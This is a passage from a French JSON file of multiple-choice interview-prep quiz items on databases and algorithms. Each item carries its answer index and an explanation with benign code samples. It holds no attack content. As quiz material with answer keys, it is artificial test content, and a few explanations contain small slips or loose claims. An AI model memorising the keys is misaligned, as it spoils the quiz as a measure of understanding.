                "Une méthode de sauvegarde automatique des données",
                "Les quatre propriétés d'une transaction fiable : Atomicité, Cohérence, Isolation, Durabilité"
            ],
            "correct": 3,
            "explanation": "ACID garantit qu'une transaction est fiable :\n- Atomicité : tout ou rien - si une opération échoue, tout est annulé (ROLLBACK) ;\n- Cohérence : les contraintes d'intégrité (clés, types, règles) restent respectées avant et après chaque transaction ;\n- Isolation : deux transactions simultanées ne se perturbent pas (niveaux d'isolation plus ou moins stricts selon le SGBD) ;\n- Durabilité : une fois validée (COMMIT), l'écriture survit à une coupure de courant (journaux de transaction).\nCes garanties sont fournies par les moteurs transactionnels (InnoDB de MySQL, PostgreSQL).\nC'est LA question de suivi quand un candidat parle de transactions : savoir développer chaque lettre avec un exemple (le virement bancaire)."
        },
        {
            "theme": "Base de données",
            "question": "Comment optimiser une requête SQL ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "En écrivant les mots-clés SQL en majuscules pour accélérer l'analyse",
                "En ajoutant des index sur toutes les colonnes de toutes les tables",
                "En remplaçant les jointures par plusieurs requêtes exécutées dans une boucle applicative",
                "En analysant le plan d'exécution (EXPLAIN), en filtrant tôt et précisément (éviter SELECT *), en créant des index sur les colonnes filtrées et jointes, en paginant les résultats et en évitant les requêtes répétées (N+1)"
            ],
            "correct": 3,
            "explanation": "Démarche dans l'ordre :\n1. mesurer : EXPLAIN (MySQL/PostgreSQL) révèle si la requête parcourt toute la table (full scan) ou utilise un index ;\n2. filtrer et projeter : WHERE pertinents, sélectionner uniquement les colonnes utiles au lieu de SELECT * ;\n3. indexer les colonnes des WHERE, JOIN et ORDER BY ;\n4. préférer une jointure à une boucle de requêtes côté application (problème N+1 des ORM) ;\n5. paginer (LIMIT/OFFSET ou curseur) pour ne jamais renvoyer des milliers de lignes d'un coup ;\n6. caches applicatifs pour les données chaudes réutilisées.\nRègle d'or : optimiser uniquement ce que la mesure a montré lent."
        },
        {
            "theme": "Base de données",
            "question": "Pourquoi créer un index et quels sont les risques d'une sur-indexation ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "Un index accélère la recherche (WHERE, JOIN, ORDER BY) mais ralentit les écritures et prend de la place : trop d'index dégradent les INSERT/UPDATE/DELETE et compliquent le choix de l'optimiseur",
                "Un index chiffre les colonnes pour les rendre illisibles",
                "Les index ne servent qu'à décorer le schéma de la base",
                "Il faut indexer toutes les colonnes, car les écritures sont de toute façon instantanées"
            ],
            "correct": 0,
            "explanation": "Un index est une structure (généralement un arbre B-tree) qui permet de retrouver une ligne sans parcourir toute la table - comme l'index d'un livre.\nCe qu'on indexe : les clés primaires et étrangères (souvent fait par le SGBD), les colonnes des WHERE fréquents, les colonnes de tri.\nLe revers de la médaille :\n- chaque INSERT/UPDATE/DELETE doit mettre à jour les index : les écritures ralentissent ;\n- espace disque consommé ;\n- un trop grand nombre d'index peut perturber l'optimiseur.\nBonne pratique : créer les indices à partir des requêtes réellement mesurées (EXPLAIN), pas par réflexe, et supprimer les index inutilisés."
        },
        {
            "theme": "Base de données",
            "question": "Quelle est la différence entre SQL et NoSQL ?",
            "level": "Intermédiaire",
            "filiere": "CDA",
            "answers": [
                "SQL gère des données structurées relationnelles (tables, schéma fixe, jointures, transactions ACID) ; NoSQL gère des modèles flexibles (documents, clés-valeurs, graphes) sans schéma imposé, en privilégiant la scalabilité horizontale",
                "NoSQL signifie 'sans SQL' : ces bases ne peuvent stocker aucune donnée",
                "SQL est réservé aux sites vitrines, NoSQL aux blogs",
                "Il n'y a aucune différence : les deux stockent exactement les mêmes données de la même façon"
            ],
            "correct": 0,
            "explanation": "SQL (MySQL, PostgreSQL) : schéma relationnel structuré, intégrité référentielle, jointures puissantes, transactions ACID, langage déclaratif standard.\nNoSQL, familles principales :\n- documents (MongoDB : objets JSON hétérogènes) ;\n- clés-valeurs (Redis : cache très rapide) ;\n- familles de colonnes (Cassandra : très gros volumes) ;\n- graphes (Neo4j : relations denses).\nNoSQL offre : schéma souple, scalabilité horizontale naturelle (sharding), excellent débit massif - mais jointures complexes et transactions multi-enregistrements plus limitées.\nChoix guidé par le besoin : données fortement liées et cohérentes -> relationnel ; volumes massifs, structure variable, cache -> NoSQL. Les systèmes réels combinent souvent les deux (ex : PostgreSQL pour le métier, Redis pour le cache)."
        },
        {
            "theme": "Base de données",
            "question": "Comment gérer plusieurs utilisateurs modifiant la même donnée simultanément ?",
            "level": "Avancé",
            "filiere": "CDA",
            "answers": [
                "En laissant le dernier écraser le premier sans contrôle, car c'est plus rapide",
                "En verrouillant toute la base dès qu'un utilisateur se connecte",
                "En interdisant toute modification de données après la création d'un compte",
                "Par des transactions isolées et des mécanismes de contrôle de concurrence : verrouillage pessimiste (SELECT ... FOR UPDATE) ou verrouillage optimiste (colonne de version qui détecte les conflits et refuse l'écrasement)"
            ],
            "correct": 3,
            "explanation": "Le risque : la perte de mise à jour ('lost update') - deux utilisateurs modifient le même enregistrement, le second écrase le premier sans le savoir.\nSolutions :\n- faire le calcul en base de manière atomique : UPDATE produits SET stock = stock - 1 (et non lire puis réécrire depuis le code) ;\n- verrouillage pessimiste : SELECT ... FOR UPDATE verrouille la ligne le temps de la transaction ;\n- verrouillage optimiste : colonne 'version' ou 'updated_at' - l'UPDATE ne réussit que si la version n'a pas changé (lignes affectées = 0 -> recharger, avertir ou réessayer) ;\n- contraintes d'intégrité pour les valeurs critiques (stock >= 0).\nExemple d'oral : décrémenter un stock ou le nombre de places restantes lors d'une réservation."
        }
    ],
    "Algorithmes": [
        {
            "theme": "Algorithmes",
            "question": "Quelle est la complexité temporelle d'une recherche dans un tableau trié avec la recherche binaire ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "O(n)",
                "O(log n)",
                "O(n²)",
                "O(1)"
            ],
            "correct": 1,
            "explanation": "La recherche binaire a une complexité O(log n) car elle divise l'espace de recherche par 2 à chaque itération."
        },
        {
            "theme": "Algorithmes",
            "question": "Quel algorithme de tri a la meilleure complexité temporelle dans le cas moyen ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Bubble Sort",
                "Insertion Sort",
                "Quick Sort",
                "Selection Sort"
            ],
            "correct": 2,
            "explanation": "Quick Sort a une complexité moyenne de O(n log n), ce qui en fait l'un des algorithmes de tri les plus efficaces en moyenne."
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce que l'algorithmie ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "L'algorithmie est le domaine d'étude de la résolution de problèmes par la mise en œuvre de suites d'opérations élémentaires selon un processus défini aboutissant à une solution",
                "L'algorithmie consiste à écrire du code directement dans un langage de programmation",
                "L'algorithmie est une méthode de chiffrement des données informatiques",
                "L'algorithmie est un ensemble de règles esthétiques pour présenter un programme"
            ],
            "correct": 0,
            "explanation": "L'algorithmie est le domaine d'étude de la résolution de problèmes par la mise en œuvre de suites d'opérations élémentaires selon un processus défini aboutissant à une solution.\nElle ne doit pas être confondue avec la programmation informatique qui est sa mise en application.\nHistoriquement, les premiers ouvrages d'algorithmie ont été rédigés au IXe siècle par le mathématicien perse Al-Khwârizmî, qui étudia de manière systématique la résolution des équations linéaires et quadratiques.\n\nL'algorithmie s'est surtout développée dans la deuxième moitié du XXe siècle, comme support conceptuel de la programmation des ordinateurs, dans le cadre du développement de l'informatique pendant cette période.\nLe tri des livres d'une bibliothèque par ordre alphabétique est un problème étudié en algorithmie, et plus généralement le tri d'un ensemble en respectant un certain ordre"
        },
        {
            "theme": "Algorithmes",
            "question": "Expliquez ce qu'est une boucle",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Une boucle est une structure de contrôle qui permet d'exécuter un bloc de code de manière répétée tant qu'une condition spécifiée est vraie",
                "Une boucle est un type de variable utilisée pour stocker plusieurs valeurs",
                "Une boucle est un algorithme qui se répète à l'infini sans condition d'arrêt",
                "Une boucle est un commentaire dans le code pour indiquer une répétition"
            ],
            "correct": 0,
            "explanation": "Une boucle est une structure de contrôle qui permet d'exécuter un bloc de code de manière répétée tant qu'une condition spécifiée est vraie.\nLes boucles sont essentielles en programmation pour automatiser des tâches répétitives et traiter des collections de données.\nIl existe plusieurs types de boucles.\n\n<b>Boucle while</b>:\n// En JavaScript\nlet i = 0;\nwhile (i < 5) {\n   console.log(i);\n   i++;\n} \n\n// En PHP\n$i = 0;\nwhile ($i < 5) {\n   echo $i;\n   $i++;\n} \n\n# En Python\ni = 0\nwhile i < 5:\n   print(i)\n   i += 1 \n\n<b>Boucle do while</b>:\n\n// En JavaScript\nlet j = 0;\ndo {\n   console.log(j);\n   j++;\n} while (j < 5);\n\n// En PHP\n$j = 0;\ndo {\n   echo $j;\n   $j++;\n} while ($j < 5);\n\n<b>Boucle for</b>:\n\n// En JavaScript\nfor (let k = 0; k < 5; k++) {\n   console.log(k);\n}\n\n// En PHP\nfor ($k = 0; $k < 5; $k++) {\n   echo $k;\n} \n\n// En Python\nfor k in range(5):\n   print(k) \nBoucle foreach :\n// En JavaScript (pour les tableaux avec for...of)\nconst arr = [1, 2, 3, 4, 5];\nfor (const value of arr) {\n   console.log(value);\n} \n// En PHP\n$arr = [1, 2, 3, 4, 5];\nforeach ($arr as $value) {\n   echo $value;\n} \n# En Python\narr = [1, 2, 3, 4, 5]\nfor value in arr:\n   print(value) \nBoucle map (pour les tableaux):\n// En JavaScript\nconst numbers = [1, 2, 3, 4, 5];\nconst doubled = numbers.map(num => num * 2);\nconsole.log(doubled);\n\n# En Python\nnumbers = [1, 2, 3, 4, 5]\ndoubled = list(map(lambda x: x * 2, numbers))\nprint(doubled)"
        },
        {
            "theme": "Algorithmes",
            "question": "Quelles sont les différences entre les structures de données linéaires et non linéaires ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Les structures linéaires sont toujours triées par ordre alphabétique alors que les non linéaires ne le sont pas",
                "Les structures linéaires sont utilisées uniquement pour les chaînes de caractères",
                "Les structures non linéaires ne peuvent contenir que des nombres",
                "Les structures de données linéaires organisent les éléments de manière séquentielle, où chaque élément a un prédécesseur et un successeur, formant une séquence unique"
            ],
            "correct": 3,
            "explanation": "Les structures de données linéaires organisent les éléments de manière séquentielle, où chaque élément a un prédécesseur et un successeur, formant une séquence unique.\nLes exemples incluent les tableaux, les listes chaînées et les files d'attente.\nEn revanche, les structures de données non linéaires organisent les éléments de manière hiérarchique ou en réseau, où chaque élément peut avoir plusieurs prédécesseurs et successeurs.\nLes exemples incluent les arbres et les graphes.\n\nVoici un tableau comparatif des caractéristiques :\n| Caractéristique | Linéaire         | Non linéaire    |\n|-----------------|------------------|-----------------|\n| Organisation    | Séquentielle     | Hiérarchique au |\n|                 |                  | ou réseau       |\n| Accès           | Direct (indexé)  | Indirect        |\n| Complexité      | Moins complexe   | Plus complexe   |\n| Exemples        | Tableaux, listes | Arbres, graphes |"
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce qu'un tableau/liste ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un tableau est une simple variable qui ne peut contenir qu'une seule valeur",
                "Un tableau ou une liste est une structure de données qui stocke une collection ordonnée d'éléments, généralement du même type, accessibles par un index numérique",
                "Un tableau est une fonction qui permet d'afficher des données sur la console",
                "Un tableau est une boucle spéciale utilisée pour répéter des instructions"
            ],
            "correct": 1,
            "explanation": "Un tableau ou une liste est une structure de données qui stocke une collection ordonnée d'éléments, généralement du même type, accessibles par un index numérique.\nEn Java, les tableaux ont une taille fixe, tandis que les listes (comme ArrayList) sont dynamiques.\n\nint[] tableau = {1, 2, 3, 4, 5};\nSystem.out.println(tableau[0]);\nList<String> liste = new ArrayList<>(Arrays.asList(\"a\", \"b\", \"c\"));\nSystem.out.println(liste.get(0));\n\nEn JavaScript, les tableaux sont dynamiques et peuvent contenir des éléments de différents types.\nlet tableau = [1, 2, 3, 4, 5];\n\nEn PHP, les tableaux peuvent être indexés numériquement ou associatifs.\n$tableau = array(1, 2, 3, 4, 5);\n$tableau = [1, 2, 3, 4, 5];\n\nEn Python, les listes sont dynamiques et peuvent contenir des éléments de différents types.\nliste = [1, 2, 3, 4, 5]"
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce qu'une map et un dictionnaire ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une map est une liste de valeurs triées automatiquement par ordre alphabétique",
                "Une map ou un dictionnaire est un tableau qui ne peut contenir que des nombres entiers",
                "Une map est une fonction mathématique utilisée pour tracer des graphiques",
                "Une map ou un dictionnaire est une structure de données qui stocke des paires clé-valeur , permettant un accès rapide aux valeurs via leurs clés uniques"
            ],
            "correct": 3,
            "explanation": "Une map ou un dictionnaire est une structure de données qui stocke des paires clé-valeur , permettant un accès rapide aux valeurs via leurs clés uniques.\n\n<b>En Java</b>:\nMap<String, Integer> map = new HashMap<>();\nmap.put(\"un\", 1);\nSystem.out.println(map.get(\"un\"));\n\n<b>JavaScript</b> offre à la fois l'objet Map et les objets littéraux comme dictionnaires.\nlet map = new Map();\nmap.set(\"un\", 1);\nconsole.log(map.get(\"un\"));\nlet dict = {\"un\": 1};\nconsole.log(dict[\"un\"]);\n\n<b>En PHP</b> :\n$dictionnaire = array(\"un\" => 1, \"deux\" => 2);\necho $dictionnaire[\"un\"]; $dictionnaire = [\"un\" => 1, \"deux\" => 2];\necho $dictionnaire[\"un\"];\n\n<b>En Python</b> :\ndictionnaire = {\"un\": 1, \"deux\": 2}\nprint(dictionnaire[\"un\"])"
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce qu'un hashmap ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Un hashmap est un algorithme de tri de chaînes de caractères",
                "Une hashmap est une implémentation spécifique de map/dictionnaire qui utilise une fonction de hachage pour stocker et accéder rapidement aux données",
                "Un hashmap est une structure qui enregistre les valeurs en double pour chaque clé",
                "Un hashmap est un tableau ordonné d’objets avec des identifiants uniques"
            ],
            "correct": 1,
            "explanation": "Une hashmap est une implémentation spécifique de map/dictionnaire qui utilise une fonction de hachage pour stocker et accéder rapidement aux données.\n\nEn Java, HashMap est une implémentation spécifique de l'interface Map.\nHashMap<String, Integer> hashMap = new HashMap<>();\nhashMap.put(\"un\", 1); \n\nDans les autres langages (JavaScript, PHP, Python), le concept de hashmap est généralement intégré dans leurs implémentations standard de dictionnaires ou d'objets."
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce qu'un objet ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Un objet est un type de boucle permettant de stocker plusieurs valeurs",
                "Un objet est un fichier qui contient uniquement du texte brut",
                "Un objet est une instance d'une classe qui encapsule des attributs (autrement dit des données) et des méthodes (autrement dit des comportements)",
                "Un objet est un tableau contenant uniquement des fonctions"
            ],
            "correct": 2,
            "explanation": "Un objet est une instance d'une classe qui encapsule des attributs (autrement dit des données) et des méthodes (autrement dit des comportements).\nDans certains langages, il peut aussi être utilisé comme une structure de données similaire à un dictionnaire.\n\n<b>En Java</b> :\npublic class Personne {\n   String nom;\n   int age;\n}\nPersonne p = new Personne();\np.nom = \"Alice\";\nSystem.out.println(p.nom);\n\n<b>En JavaScript</b>, il y a deux méthodes pour construire des objets :\nlet alice = {nom: \"Alice\", age: 30};\nconsole.log(alice.nom);\nclass Personne {\n   constructor(nom, age) {\n       this.nom = nom;\n       this.age = age;\n   }\n}\nlet p = new Personne(\"Alice\", 30);\nconsole.log(p.nom);\n\n<b>En PHP</b>:\nclass Personne {\n   public $nom;\n   public $age;\n}\n$p = new Personne();\n$p->nom = \"Alice\";\necho $p->nom; $objet = (object)[\"nom\" => \"Alice\", \"age\" => 30];\necho $objet->nom;\n\n<b>En Python</b>:\nclass Personne:\n   def __init__(self, nom, age):\n       self.nom = nom\n       self.age = age\n\np = Personne(\"Alice\", 30)\nprint(p.nom)"
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce qu'un JSON ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Le JSON est un langage de programmation dérivé du Java",
                "La JavaScript Object Notation (JSON) est un format de données textuelles léger, fondée sur la syntaxe des objets JavaScript, utilisé pour l'échange de données",
                "Le JSON est une bibliothèque Python pour créer des objets dynamiques",
                "Le JSON est un protocole réseau pour transférer des fichiers binaires"
            ],
            "correct": 1,
            "explanation": "La JavaScript Object Notation (JSON) est un format de données textuelles léger, fondée sur la syntaxe des objets JavaScript, utilisé pour l'échange de données.\n\n{\n   \"nom\": \"Alice\",\n   \"age\": 30,\n   \"ville\": \"Paris\"\n}"
        },
        {
            "theme": "Algorithmes",
            "question": "Quels sont les différents paradigmes ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Les paradigmes sont uniquement liés à la programmation orientée objet",
                "Les paradigmes définissent la vitesse d'exécution d'un programme",
                "Les paradigmes sont des modèles de représentation graphique de code",
                "En programmation et conception de systèmes, plusieurs paradigmes importants coexistent"
            ],
            "correct": 3,
            "explanation": "En programmation et conception de systèmes, plusieurs paradigmes importants coexistent.\n\t- La programmation impérative se concentre sur la description des étapes pour accomplir une tâche.\n\t- La programmation orientée objet organise le code en objets contenant données et méthodes\n\t- La programmation fonctionnelle traite le calcul comme l'évaluation de fonctions mathématiques sans état ni données mutables.\n\t- La programmation déclarative décrit le résultat souhaité sans spécifier explicitement les étapes pour y parvenir.\n\t- La programmation événementielle base le flux du programme sur des événements comme les actions utilisateur.\n\t- La programmation parallèle permet l'exécution simultanée de plusieurs tâches.\n\t- Enfin, la programmation réactive se concentre sur les flux de données et la propagation des changements.\n\nChaque paradigme a ses forces et ses faiblesses, et le choix dépend souvent du problème à résoudre et du contexte d'application."
        },
        {
            "theme": "Algorithmes",
            "question": "Expliquez le concept de closure",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une closure est une boucle qui se répète indéfiniment",
                "Une closure est une variable qui garde la dernière valeur utilisée dans une fonction",
                "Une closure (ou fermeture) est une fonction qui capture et conserve l'accès aux variables de son environnement lexical, même lorsqu'elle est exécutée en dehors de cet environnement",
                "Une closure est un objet qui permet de compiler du code automatiquement"
            ],
            "correct": 2,
            "explanation": "Une closure (ou fermeture) est une fonction qui capture et conserve l'accès aux variables de son environnement lexical, même lorsqu'elle est exécutée en dehors de cet environnement.\nEn d'autres termes, une closure \"se souvient\" du contexte dans lequel elle a été créée.\nCe concept permet de créer des fonctions avec un état privé, d'implémenter des fonctions de fabrique, et de gérer des variables privées en programmation orientée objet.\n\n<b>En Java</b>:\npublic interface Incrementer {\n   int increment();\n}\n\npublic static Incrementer createIncrementer() {\n   final int[] count = {0};\n   return new Incrementer() {\n       @Override\n       public int increment() {\n           return ++count[0];\n       }\n   };\n} \n\n<b>En PHP</b>:\nfunction createIncrementer() {\n   $count = 0;\n   return function() use (&$count) {\n       return ++$count;\n   };\n} \n\n<b>En Python</b>:\ndef create_incrementer():\n   count = 0\n   def increment():\n       nonlocal count\n       count += 1\n       return count\n   return increment \n\n<b>En JavaScript</b>:\nfunction createIncrementer() {\n   let count = 0;\n   return function() {\n       return ++count;\n    };\n}"
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce qu'une expression lambda ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une expression lambda , également appelée fonction anonyme , est une fonction brève et sans nom qui peut être définie et utilisée immédiatement",
                "Une expression lambda est un type de variable globale",
                "Une expression lambda est une méthode de chiffrement des données",
                "Une expression lambda est une classe spéciale pour créer des objets"
            ],
            "correct": 0,
            "explanation": "Une expression lambda , également appelée fonction anonyme , est une fonction brève et sans nom qui peut être définie et utilisée immédiatement.\nElle est particulièrement utile pour créer des fonctions simples à la volée, souvent comme arguments d'autres fonctions.\nLes expressions lambda sont un concept clé de la programmation fonctionnelle et sont présentes dans de nombreux langages modernes.\nElles permettent d'écrire du code plus concis et expressif, en évitant la nécessité de définir des fonctions complètes pour des opérations simples et ponctuelles.\nLes lambda sont fréquemment utilisées avec des fonctions de haut niveau comme map, filter, ou reduce.\n\n<b>En PHP</b> :\n// Déclaration d'une variable\n$multiplier = 2;\n\n// Expression lambda pour doubler un nombre\n$doubleValue = fn($x) => $x * $multiplier;\n\n// Utilisation de la lambda\necho $doubleValue(5); \n\n// <b>Affiche: 10 En Python</b>:\n# Déclaration d'une variable\nmultiplier = 2\n\n# Expression lambda pour doubler un nombre\ndouble_value = lambda x: x * multiplier\n\n# Utilisation de la lambda\nprint(double_value(5)) \n\n<b>En JavaScript</b> :\n// Déclaration d'une variable\nconst multiplier = 2;\n\n// Expression lambda pour doubler un nombre\nconst doubleValue = (x) => x * multiplier;\n\n// Utilisation de la lambda\nconsole.log(doubleValue(5));"
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce que la complexité temporelle ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "La complexité temporelle est une mesure de la quantité de temps qu'un algorithme prend pour s'exécuter en fonction de la taille de son entrée",
                "La complexité temporelle indique la quantité de mémoire utilisée par un programme",
                "La complexité temporelle est le nombre total de fonctions écrites dans un programme",
                "La complexité temporelle mesure le temps nécessaire à la compilation d’un programme"
            ],
            "correct": 0,
            "explanation": "La complexité temporelle est une mesure de la quantité de temps qu'un algorithme prend pour s'exécuter en fonction de la taille de son entrée.\n\nElle permet d'évaluer l'efficacité d'un algorithme et de comparer différents algorithmes entre eux.\nOn utilise couramment la notamment grand O pour exprimer la complexité temporelle.\n\t- O(1) ou temps constant : l'algorithme prend le même temps d'exécution quelle que soit la taille de l'entrée.\nC'est l'exemple de l'accès à un élément d'un tableau\n\t- O(log n) ou temps logarithmique : l'algorithme réduit la taille de l'entrée de manière exponentielle à chaque étape, comme dans la recherche binaire.\nC'est par exemple le cas de la recherche binaire.\n\t- O(n) ou temps linéaire : l'algorithme prend un temps proportionnel à la taille de l'entrée. On rencontre cette complexité en parcourant un tableau\n\t- O(n log n) ou temps quasi-linéaire : souvent rencontré dans les algorithmes de tri efficaces, comme le tri par fusion.\n\t- O(n²) ou temps quadratique : l'algorithme prend un temps proportionnel au carré de la taille de l'entrée, comme dans le tri à bulles.\n\t- O(2^n) ou temps exponentiel : l'algorithme prend un temps qui double avec chaque augmentation de la taille de l'entrée, souvent associé à des algorithmes de force brute.\n\nOn appelle cette notation, la notation de Landau ."
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce que la complexité spatiale ?",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "La complexité spatiale est une mesure de la quantité de mémoire qu'un algorithme utilise en fonction de la taille de son entrée",
                "La complexité spatiale évalue le temps d’exécution d’un programme",
                "La complexité spatiale mesure la taille du code source",
                "La complexité spatiale indique la profondeur des boucles imbriquées"
            ],
            "correct": 0,
            "explanation": "La complexité spatiale est une mesure de la quantité de mémoire qu'un algorithme utilise en fonction de la taille de son entrée.\nElle permet d'évaluer l'efficacité d'un algorithme en termes de ressources mémoire et de comparer différents algorithmes entre eux.\nOn utilise couramment la notamment grand O pour exprimer la complexité spatiale.\n\t- O(1) ou espace constant : l'algorithme utilise une quantité fixe de mémoire, indépendamment de la taille de l'entrée.\nC'est l'exemple d'un algorithme qui utilise un nombre constant de variables.\n\t- O(log n) ou espace logarithmique : l'algorithme utilise une quantité de mémoire qui augmente logarithmiquement avec la taille de l'entrée, souvent rencontré dans les algorithmes de recherche récursive.\n\t- O(n) ou espace linéaire : l'algorithme utilise une quantité de mémoire proportionnelle à la taille de l'entrée, comme lors de la création d'un tableau pour stocker des éléments.\n\t- O(n log n) : l'algorithme utilise une quantité de mémoire proportionnelle à n log n, comme dans certains algorithmes de tri.\n\t- O(n²) ou espace quadratique : l'algorithme utilise une quantité de mémoire proportionnelle au carré de la taille de l'entrée, comme dans le cas d'une matrice d'adjacence pour représenter un graphe.\n\t- O(2^n) ou espace exponentiel : l'algorithme utilise une quantité de mémoire qui double avec chaque augmentation de la taille de l'entrée, souvent associé à des algorithmes de force brute.\n\nOn appelle cette notation, la notation de Landau ."
        },
        {
            "theme": "Algorithmes",
            "question": "Que sont les algorithmes de tri ?",
            "level": "Facile",
            "filiere": "Toute",
            "answers": [
                "Les algorithmes de tri sont des méthodes utilisées pour réorganiser les éléments d'un tableau ou d'une liste dans un ordre spécifique, généralement croissant ou décroissant",
                "Les algorithmes de tri servent à supprimer les doublons d’une liste",
                "Les algorithmes de tri comparent les données binaires entre deux fichiers",
                "Les algorithmes de tri sont des fonctions qui mélangent les éléments aléatoirement"
            ],
            "correct": 0,
            "explanation": "Les algorithmes de tri sont des méthodes utilisées pour réorganiser les éléments d'un tableau ou d'une liste dans un ordre spécifique, généralement croissant ou décroissant.\nVoici quelques algorithmes de tri courants et leur fonctionnement :\nLe tri à <b>bulles ou Bubble Sort</b> fonctionne en comparant chaque paire d'éléments adjacents et en les échangeant si nécessaire.\nCe processus est répété jusqu'à ce que le tableau soit trié.\nC'est un algorithme simple mais inefficace pour de grandes listes.\n\ndef bubble_sort(arr):\n    n = len(arr)\n    for i in range(n):\n        for j in range(0, n-i-1):\n            if arr[j] > arr[j+1]:\n                arr[j], arr[j+1] = arr[j+1], arr[j]\n\n# Exemple d'utilisation\narr = [64, 34, 25, 12, 22, 11, 90]\nbubble_sort(arr)\nprint('Tableau trié par tri à bulles :')\nfor i in range(len(arr)):\n    print('%d' % arr[i], end=' ')\n\nLe tri par <b>insertion ou Insertion Sort</b> consiste à construire un tableau trié un élément à la fois.\nIl prend chaque élément du tableau et le place à sa position correcte dans la partie déjà triée.\nC'est efficace pour les petites listes.\n\ndef insertion_sort(arr):\n    for i in range(1, len(arr)):\n        key = arr[i]\n        j = i-1\n        while j >= 0 and key < arr[j]:\n            arr[j+1] = arr[j]\n            j -= 1\n        arr[j+1] = key\n\n# Exemple d'utilisation\narr = [12, 11, 13, 5, 6]\ninsertion_sort(arr)\nprint('Tableau trié par tri par insertion :')\nfor i in range(len(arr)):\n    print('%d' % arr[i], end=' ')\n\nLe tri par <b>sélection ou Selection Sort</b> fonctionne en trouvant le plus petit élément dans le tableau non trié et en l'échangeant avec le premier élément non trié.\nCe processus est répété pour chaque élément du tableau.\n\ndef selection_sort(arr):\n    for i in range(len(arr)):\n        min_idx = i\n        for j in range(i+1, len(arr)):\n            if arr[min_idx] > arr[j]:\n                min_idx = j\n        arr[i], arr[min_idx] = arr[min_idx], arr[i]\n\n# Exemple d'utilisation\narr = [64, 25, 12, 22, 11]\nselection_sort(arr)\nprint('Tableau trié par tri par sélection :')\nfor i in range(len(arr)):\n    print('%d' % arr[i], end=' ')\n\nLe tri <b>fusion ou Merge Sort</b> est un algorithme de tri par division qui divise le tableau en deux moitiés, les trie de manière récursive et les fusionne ensuite.\nC'est un algorithme efficace avec une complexité de O(n log n).\n\ndef merge_sort(arr):\n    if len(arr) > 1:\n        mid = len(arr) // 2\n        left_half = arr[:mid]\n        right_half = arr[mid:]\n\n        merge_sort(left_half)\n        merge_sort(right_half)\n\n        i = j = k = 0\n\n        while i < len(left_half) and j < len(right_half):\n            if left_half[i] < right_half[j]:\n                arr[k] = left_half[i]\n                i += 1\n            else:\n                arr[k] = right_half[j]\n                j += 1\n            k += 1\n\n        while i < len(left_half):\n            arr[k] = left_half[i]\n            i += 1\n            k += 1\n\n        while j < len(right_half):\n            arr[k] = right_half[j]\n            j += 1\n            k += 1\n\n# Exemple d'utilisation\narr = [12, 11, 13, 5, 6, 7]\nmerge_sort(arr)\nprint('Tableau trié par tri fusion :')\nfor i in range(len(arr)):\n    print('%d' % arr[i], end=' ')"
        },
        {
            "theme": "Algorithmes",
            "question": "Expliquez le concept divide and conquer",
            "level": "Avancé",
            "filiere": "Toute",
            "answers": [
                "Une méthode consistant à exécuter plusieurs algorithmes en parallèle pour comparer leurs résultats",
                "Le concept de divide and conquer (diviser pour régner) est une stratégie algorithmique utilisée pour résoudre des problèmes complexes en les décomposant en sous-problèmes plus simples",
                "Une technique pour éviter la récursion en divisant les boucles en plusieurs segments indépendants",
                "Un algorithme qui utilise plusieurs threads pour réduire le temps d’exécution"
            ],
            "correct": 1,
            "explanation": "Le concept de divide and conquer (diviser pour régner) est une stratégie algorithmique utilisée pour résoudre des problèmes complexes en les décomposant en sous-problèmes plus simples.\nCe processus se déroule en trois étapes. \n\t- Diviser - Le problème initial est divisé en plusieurs sous-problèmes plus petits.\n\t- Conquérir - Chaque sous-problème est résolu individuellement, souvent de manière récursive. \n\t- Combiner - Les solutions des sous-problèmes sont ensuite combinées pour obtenir la solution du problème original. \nCette approche est particulièrement efficace pour des problèmes tels que le tri, la recherche, et divers calculs mathématiques."
        },
        {
            "theme": "Algorithmes",
            "question": "Qu'est-ce que le concept de récursion ?",
            "level": "Intermédiaire",
            "filiere": "Toute",
            "answers": [
                "Une méthode permettant d’éviter les boucles en utilisant des structures de données dynamiques",
                "La récursion est un concept en programmation où une fonction s'appelle elle-même pour résoudre un problème",
                "Un procédé de compilation qui optimise les appels de fonctions imbriqués",
                "Une technique utilisée uniquement pour les algorithmes de tri comme QuickSort"
            ],
            "correct": 1,
